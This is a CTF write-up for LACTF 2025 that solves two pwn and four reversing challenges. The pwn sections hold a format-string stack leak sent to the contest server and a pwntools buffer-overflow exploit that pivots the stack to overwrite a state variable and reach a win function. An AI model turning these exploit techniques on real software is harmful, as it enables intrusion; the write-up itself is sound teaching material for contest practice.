# LACTF2025

[LACTF](https://platform.lac.tf/) was one of the most fantastic ctf I've played ever.

Unfortunately, I could not spend enough time to solve challenges.
I solved 4 reversing challenges, 2 pwn challenges in the last few hours of CTF competition.

## 2password
<primary-label ref="pwn"/>
<secondary-label ref="user"/>
As we can see, there's a format-string-bug in main function. 
```c
int main(void) {
  setbuf(stdout, NULL);
  char username[42];
  readline(username, sizeof username, stdin);
  char password1[42];
  readline(password1, sizeof password1, stdin);
  char password2[42];
  readline(password2, sizeof password2, stdin);
  FILE *flag_file = fopen("flag.txt", "r");
  if (!flag_file) {
    puts("can't open flag");
    exit(1);
  }
  char flag[42];
  readline(flag, sizeof flag, flag_file);
  if (strcmp(username, "kaiphait") == 0 &&
      strcmp(password1, "correct horse battery staple") == 0 &&
      strcmp(password2, flag) == 0) {
    puts("Access granted");
  } else {
    printf("Incorrect password for user ");
    printf(username);
    printf("\n");
  }
}
```
Send format strings to server, and got flag form leaked stack.
```bash
[~/dc/ctf/la/2password] >>>nc chall.lac.tf 31142
Enter username: %lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/%lx/
Enter password1: Enter password2: a
Incorrect password for user 7ffe10bda030/0/0/5736b18244a8/0/75687b667463616c/66635f327265746e/7d38367a783063/0/0/
```
```py
leak = "75687b667463616c/66635f327265746e/7d38367a783063"
little = ''.join(leak.split("/")[::-1])
flag = bytes.fromhex(little).decode()[::-1]
print(f"{flag=}")
```

## stage-change
<primary-label ref="pwn"/>
<secondary-label ref="user"/>
There's a buffer-overflow vulnerability in "vuln".
```c
void vuln(){
    char local_buf[0x20];
    puts("Hey there, I'm deaddead. Who are you?");
    fgets(local_buf, 0x30, stdin);
}
```
The win function was provided, but there's a validation which check the state value.
Of course, the state was initialized in main function, so we have to rewrite before call win function.
```c
void win() {
    char filebuf[64];
    strcpy(filebuf, "./flag.txt");
    FILE* flagfile = fopen("flag.txt", "r");

    /* ********** ********** */
    // Note this condition in win()
    if(state != 0xf1eeee2d) {
        puts("\ntoo ded to gib you the flag");
        exit(1);
    }
    /* ********** ********** */
    //***print the flag, omit***
}
```
```c
int main(){
    state = 0xdeaddead;
```
the exploit flow is pivoting the stack and then call fgets() in "vuln" again.
Calling fgets with broken rbp which pointed to .data region for example allow us to overwrite into arbitrary address.
```bash
gef> disass vuln 
Dump of assembler code for function vuln:
----------------------------omit---------------------------
   0x00000000004012d0 <+27>:    mov    rdx,QWORD PTR [rip+0x2d59]        # 0x404030 <stdin@GLIBC_2.2.5>
   0x00000000004012d7 <+34>:    lea    rax,[rbp-0x20]
   0x00000000004012db <+38>:    mov    esi,0x30
   0x00000000004012e0 <+43>:    mov    rdi,rax
   0x00000000004012e3 <+46>:    call   0x4010c0 <fgets@plt>
```
my exploit
```py
from pwn import *

e = ELF("chall")
p = e.process()
#p = remote("chall.lac.tf", 31593)

#gdb.attach(p, '''
#          b *vuln+53 
#              ''')
#
p.recv()

state = 0x00404540

payload = b"A"*0x20
payload+= p64(state+0x20)
payload+= p64(0x004012d0)

payload = payload[:-1]

payload+= p64(0xf1eeee2d)
payload+= p64(0xf1eeee2d)
payload+= p64(0xf1eeee2d)
payload+= p64(0xf1eeee2d)
payload+= p64(state+0x20)
payload+= p64(e.sym["win"]+0xf)
print(f"{payload=}")

p.sendline(payload)

p.interactive()
```

## javascription (rev, javascript)
<primary-label ref="rev"/>

the challenge
```js
const msg = document.getElementById("msg");
const flagInp = document.getElementById("flag");
const checkBtn = document.getElementById("check");

function checkFlag(flag) {
    const step1 = btoa(flag);
    const step2 = step1.split("").reverse().join("");
    const step3 = step2.replaceAll("Z", "[OLD_DATA]");
    const step4 = encodeURIComponent(step3);
    const step5 = btoa(step4);
    return step5 === "JTNEJTNEUWZsSlglNUJPTERfREFUQSU1RG85MWNzeFdZMzlWZXNwbmVwSjMlNUJPTERfREFUQSU1RGY5bWI3JTVCT0xEX0RBVEElNURHZGpGR2I=";
}

checkBtn.addEventListener("click", () => {
    const flag = flagInp.value.toLowerCase();
    if (checkFlag(flag)) {
        flagInp.remove();
        checkBtn.remove();
        msg.innerText = flag;
        msg.classList.add("correct");
    } else {
        checkBtn.classList.remove("shake");
        checkBtn.offsetHeight;
        checkBtn.classList.add("shake");
    }
});
```
solved with cyber chief: [](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)URL_Decode()Find_/_Replace(%7B'option':'Simple%20string','string':'%5BOLD_DATA%5D'%7D,'Z',true,false,true,false)Reverse('Character')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=SlRORUpUTkVVV1pzU2xnbE5VSlBURVJmUkVGVVFTVTFSRzg1TVdOemVGZFpNemxXWlhOd2JtVndTak1sTlVKUFRFUmZSRUZVUVNVMVJHWTViV0kzSlRWQ1QweEVYMFJCVkVFbE5VUkhaR3BHUjJJPQ&oeol=VT)

## nine-solves(rev, elf)
<primary-label ref="rev"/>

decompile with ida.
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 i; // rsi
  unsigned int v4; // eax
  int v5; // ecx
  int v6; // edx
  char v8[6]; // [rsp+0h] [rbp-18h] BYREF
  char v9; // [rsp+6h] [rbp-12h]

  puts("Welcome to the Tianhuo Research Center.");
  printf("Please enter your access code: ");
  fflush(stdout);
  fgets(v8, 16, stdin);
  for ( i = 0LL; i != 6; ++i )
  {
    v4 = v8[i];
    if ( (unsigned __int8)(v8[i] - 32) > 0x5Eu )
      goto LABEL_14;
    v5 = yi[i];
    if ( !v5 )
      goto LABEL_14;
    v6 = 0;
    while ( (v4 & 1) == 0 )
    {
      ++v6;
      v4 >>= 1;
      if ( v5 == v6 )
        goto LABEL_9;
LABEL_6:
      if ( v4 == 1 )
        goto LABEL_14;
    }
    ++v6;
    v4 = 3 * v4 + 1;
    if ( v5 != v6 )
      goto LABEL_6;
LABEL_9:
    if ( v4 != 1 )
      goto LABEL_14;
  }
  if ( !v9 || v9 == 10 )
  {
    eigong();
    return 0;
  }
LABEL_14:
  puts("ACCESS DENIED");
  return 1;
}
```
The yi array.

![Screenshot_20250210_232341.png](Screenshot_20250210_232341.png)

just brute-force and find the flag.
```py
def validation(n):
    steps = 0
    while n != 1:
        steps += 1
        if n % 2 == 0:
            n = n // 2
        else:
            n = 3 * n + 1
    return steps

target_steps = [0x1B, 0x26, 0x57, 0x5F, 0x76, 0x9]
result = []

for i in range(6):
    for c in range(32, 127):
        steps = validation(c)
        if steps == target_steps[i]:
            result.append(chr(c))
            break
            
print(''.join(result))
```

## patrics(rev, elf)
<primary-label ref="rev"/>
the main function.

![Screenshot_20250210_234306.png](Screenshot_20250210_234306.png)

the important point is this area.
```c
    v4 = v3 >> 1;
    if ( v3 > 1 )
    {
      v5 = 0LL;
      do
      {
        v8[2 * v5] = s[v5];
        v8[2 * v5 + 1] = s[v4 + v5];
        ++v5;
      }
      while ( v5 < v4 );
```
v4 is half value of length of input.
```c
v4 = v3 >>1;
```
is same as
```c
v4 = v3 / 2;
```
The do-while loop splits the input into the first half and the second half based on the index.
The target is follows.
```c
.data:0000000000004048 ; char *target
.data:0000000000004048 target          dq offset aLAlcotsftTihne
.data:0000000000004048                                         ; DATA XREF: main+5B↑r
.data:0000000000004048                                         ; main+C3↑r
.data:0000000000004048 _data           ends                    ; "l_alcotsft{_tihne__ifnlfaign_igtoyt}"
```
My solver.
```py
enc = "l_alcotsft{_tihne__ifnlfaign_igtoyt}"
f = ''
l = ''
for i in range(len(enc)):
    if i % 2 == 0:
        f += enc[i]
    else:
        l += enc[i]
flag = f + l
print(f"{flag=}")
```

## the-eye(rev, elf)
<primary-label ref="rev"/>
the main function.
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char *s; // [rsp+0h] [rbp-10h]
  int i; // [rsp+Ch] [rbp-4h]

  v3 = time(0LL);
  srand(v3);
  s = (char *)read_msg();
  for ( i = 0; i <= 21; ++i )
    shuffle(s);
  puts(s);
  free(s);
  return 0;
}
```
the shuffle function.
```c
__int64 __fastcall shuffle(const char *a1)
{
  __int64 result; // rax
  unsigned __int8 v2; // [rsp+13h] [rbp-Dh]
  int v3; // [rsp+14h] [rbp-Ch]
  int i; // [rsp+1Ch] [rbp-4h]

  result = (unsigned int)strlen(a1) - 1;
  for ( i = result; i >= 0; --i )
  {
    v3 = rand() % (i + 1);
    v2 = a1[i];
    a1[i] = a1[v3];
    result = v2;
    a1[v3] = v2;
  }
  return result;
}
```
This program shuffle msg.txt for 22 times.
The problem is that we can predict the seed because time(NULL) changes its value every second.
```py
from pwn import *
import time

nc = "nc chall.lac.tf 31313"

HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])
p = remote(HOST, PORT)

enc = p.recvline()

print(f"{enc=}")
print(f"{time.time()=}")
```
Get encrypted string from remote server and brute-force seed.
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

void rev_shuffle(char *str) {
    int len = strlen(str);
    int *rs[0x16];
    for (int i = 0; i <= 0x15; i++) {
        rs[i] = (int *)malloc(len * sizeof(int));
        for (int j = len - 1; j >= 0; --j) {
            (rs[i])[j] = rand() % (j + 1);
        }
    }
    for (int i = 0x15; i >= 0; i--) {
        int *rand_vals = rs[i];
        for (int j = 0; j < len; j++) {
            int v3 = rand_vals[j];
            char v2 = str[v3];
            str[v3] = str[j];
            str[j] = v2;
        }
    }
    for (int i = 0; i <= 0x15; i++) {
        free(rs[i]);
    }
}

int main() {
    char enc[] = "lntdsdeegt psalp_htewoenWti c ga-rl rp oeit ahtsoagsia rmhts mddth exnosa tvmeseedrenrTiea eadgrtltieantaah.dy  a   dsssouhsu dheei ramelinuh t s dehia,aohssdo,polmpm t;oe_ttp  l morhw.e_tgoe acarstievsvftsaefhrnewet,olda n{slnn. uhy estatntst  om,x s sr oraeeh a ges tsntaf n trhda mhnfbe elheaee at cyte stvruyn_enEtiin endranel buemedt air iei  sd enaeeilo-l  erirutir eat asaclh soeel aotea_l yasrsetinnccoa sgomnei lnhgscecy h yftettraah di euu  nn2d  Hnoni l aeiluitrghsn a d treahosgiiute? g  cnsa iea.teuWseeflceee cis hpiml ,ycp  ottyapmpios}ety tmhnroeo e assruiEs2ee  lnnoyhms eaoogeetysgpto ra cc nxeaeaexantn ephevn oe r vgnplHedtpydt ere Nne  ihlneOrd it,genieu ,ertr_c  sa_slftnccsoxiweA tdeisd tnfseac r rppo hei";
    
    time_t seed =1739111698;
    char tmp[1024]={0};
    
    for (int i = 0; i < 5; i++) { 
        for (int i = 0;i < 1024; i++) {
            tmp[i] = 0;
        }
        strcpy(tmp, enc);
        srand(seed);
        
        rev_shuffle(tmp);
        
        printf("Timestamp: %ld\n", seed);
        printf("Result: %s\n\n", tmp);
        seed--;
    }
    
    return 0;
}
```
